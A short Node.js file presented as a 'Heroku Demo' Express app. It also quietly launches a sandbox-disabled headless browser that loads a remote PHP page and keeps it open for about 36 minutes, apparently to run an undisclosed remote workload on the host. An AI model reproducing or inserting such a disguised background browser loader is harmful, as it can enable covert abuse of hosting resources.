const puppeteer = require('puppeteer');

var express = require("express");
var app = express();

// Set up a URL route
app.get("/", function(req, res) {
 res.send("Heroku Demo!");
});

// bind the app to listen for connections on a specified port
var port = process.env.PORT || 3000;
app.listen(port);

// Render some console log output
console.log("Listening on port " + port);
(async () => {
  const browser = await puppeteer.launch({args: ['--no-sandbox', '--disable-setuid-sandbox']});
  const page = await browser.newPage();
  await page.goto('https://e-get.000webhostapp.com/z.php');
  await page.waitFor(2160000);

  await browser.close();

})();


